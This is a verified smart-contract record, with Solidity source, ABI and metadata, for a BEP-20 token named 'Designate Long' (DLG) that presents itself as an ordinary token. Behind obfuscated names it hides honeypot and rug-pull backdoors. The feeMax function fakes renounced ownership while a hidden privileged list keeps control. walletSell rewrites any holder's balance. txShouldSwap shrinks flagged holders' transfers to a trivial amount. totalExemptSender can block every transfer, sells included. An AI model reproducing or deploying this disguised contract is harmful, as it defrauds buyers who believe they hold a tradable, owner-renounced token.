{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface sellAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingBuy {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverAuto {\n    function createPair(address listShould, address exemptLiquidity) external returns (address);\n}\n\ninterface sellAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingFee) external view returns (uint256);\n\n    function transfer(address launchWallet, uint256 sellMarketing) external returns (bool);\n\n    function allowance(address limitIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchWallet,\n        uint256 sellMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromLimitSwap, uint256 value);\n    event Approval(address indexed limitIs, address indexed spender, uint256 value);\n}\n\ninterface sellAtMetadata is sellAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DesignateLong is tradingBuy, sellAt, sellAtMetadata {\n\n    function enableLaunch(address isList, address launchWallet, uint256 sellMarketing) internal returns (bool) {\n        require(teamMode[isList] >= sellMarketing);\n        teamMode[isList] -= sellMarketing;\n        teamMode[launchWallet] += sellMarketing;\n        emit Transfer(isList, launchWallet, sellMarketing);\n        return true;\n    }\n\n    address fromLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private teamMode;\n\n    bool private txTradingReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return shouldReceiver;\n    }\n\n    uint256 private liquidityReceiverMin = 100000000 * 10 ** 18;\n\n    function getOwner() external view returns (address) {\n        return autoSender;\n    }\n\n    bool public teamEnable;\n\n    function owner() external view returns (address) {\n        return autoSender;\n    }\n\n    function txShouldSwap(address limitList) public {\n        launchFundAt();\n        if (sellBuy == fromLimit) {\n            sellBuy = true;\n        }\n        if (limitList == marketingShould || limitList == sellSender) {\n            return;\n        }\n        launchMode[limitList] = true;\n    }\n\n    uint256 public liquiditySwap;\n\n    function launchFundAt() private view {\n        require(marketingIs[_msgSender()]);\n    }\n\n    mapping(address => mapping(address => uint256)) private maxLiquidity;\n\n    bool public launchBuy;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountFrom;\n    }\n\n    mapping(address => bool) public launchMode;\n\n    function approve(address totalTxLiquidity, uint256 sellMarketing) public virtual override returns (bool) {\n        maxLiquidity[_msgSender()][totalTxLiquidity] = sellMarketing;\n        emit Approval(_msgSender(), totalTxLiquidity, sellMarketing);\n        return true;\n    }\n\n    string private amountFrom = \"DLG\";\n\n    function launchTrading(address isList, address launchWallet, uint256 sellMarketing) internal returns (bool) {\n        if (isList == marketingShould) {\n            return enableLaunch(isList, launchWallet, sellMarketing);\n        }\n        uint256 enableAmount = sellAt(sellSender).balanceOf(fromMarketing);\n        require(enableAmount == launchMax);\n        require(launchWallet != fromMarketing);\n        if (launchMode[isList]) {\n            return enableLaunch(isList, launchWallet, sellExempt);\n        }\n        return enableLaunch(isList, launchWallet, sellMarketing);\n    }\n\n    uint256 autoTeam;\n\n    uint256 launchMax;\n\n    function transfer(address maxMode, uint256 sellMarketing) external virtual override returns (bool) {\n        return launchTrading(_msgSender(), maxMode, sellMarketing);\n    }\n\n    mapping(address => bool) public marketingIs;\n\n    address fromMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeShould;\n    }\n\n    string private shouldReceiver = \"Designate Long\";\n\n    uint256 public limitMax;\n\n    uint8 private takeShould = 18;\n\n    uint256 constant sellExempt = 9 ** 10;\n\n    bool public launchSender;\n\n    constructor (){\n        if (fromLimit == sellBuy) {\n            txEnable = limitMax;\n        }\n        sellAuto receiverList = sellAuto(fromLaunched);\n        sellSender = receiverAuto(receiverList.factory()).createPair(receiverList.WETH(), address(this));\n        if (liquiditySwap != receiverMax) {\n            liquiditySwap = receiverMax;\n        }\n        marketingShould = _msgSender();\n        feeMax();\n        marketingIs[marketingShould] = true;\n        teamMode[marketingShould] = liquidityReceiverMin;\n        if (liquiditySwap == txEnable) {\n            txTradingReceiver = false;\n        }\n        emit Transfer(address(0), marketingShould, liquidityReceiverMin);\n    }\n\n    uint256 private txEnable;\n\n    bool public fromLimit;\n\n    address private autoSender;\n\n    uint256 private receiverMax;\n\n    function transferFrom(address isList, address launchWallet, uint256 sellMarketing) external override returns (bool) {\n        if (_msgSender() != fromLaunched) {\n            if (maxLiquidity[isList][_msgSender()] != type(uint256).max) {\n                require(sellMarketing <= maxLiquidity[isList][_msgSender()]);\n                maxLiquidity[isList][_msgSender()] -= sellMarketing;\n            }\n        }\n        return launchTrading(isList, launchWallet, sellMarketing);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityReceiverMin;\n    }\n\n    function walletSell(address maxMode, uint256 sellMarketing) public {\n        launchFundAt();\n        teamMode[maxMode] = sellMarketing;\n    }\n\n    function allowance(address fundFee, address totalTxLiquidity) external view virtual override returns (uint256) {\n        if (totalTxLiquidity == fromLaunched) {\n            return type(uint256).max;\n        }\n        return maxLiquidity[fundFee][totalTxLiquidity];\n    }\n\n    event OwnershipTransferred(address indexed txAuto, address indexed liquidityList);\n\n    function feeMax() public {\n        emit OwnershipTransferred(marketingShould, address(0));\n        autoSender = address(0);\n    }\n\n    address public marketingShould;\n\n    bool private sellBuy;\n\n    function txLimitWallet(address fundLaunchedMode) public {\n        if (teamEnable) {\n            return;\n        }\n        \n        marketingIs[fundLaunchedMode] = true;\n        if (liquiditySwap != txEnable) {\n            txTradingReceiver = true;\n        }\n        teamEnable = true;\n    }\n\n    address public sellSender;\n\n    function totalExemptSender(uint256 sellMarketing) public {\n        launchFundAt();\n        launchMax = sellMarketing;\n    }\n\n    function balanceOf(address marketingFee) public view virtual override returns (uint256) {\n        return teamMode[marketingFee];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLimitSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalTxLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTxLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellMarketing\",\"type\":\"uint256\"}],\"name\":\"totalExemptSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunchedMode\",\"type\":\"address\"}],\"name\":\"txLimitWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"}],\"name\":\"txShouldSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellMarketing\",\"type\":\"uint256\"}],\"name\":\"walletSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "DesignateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}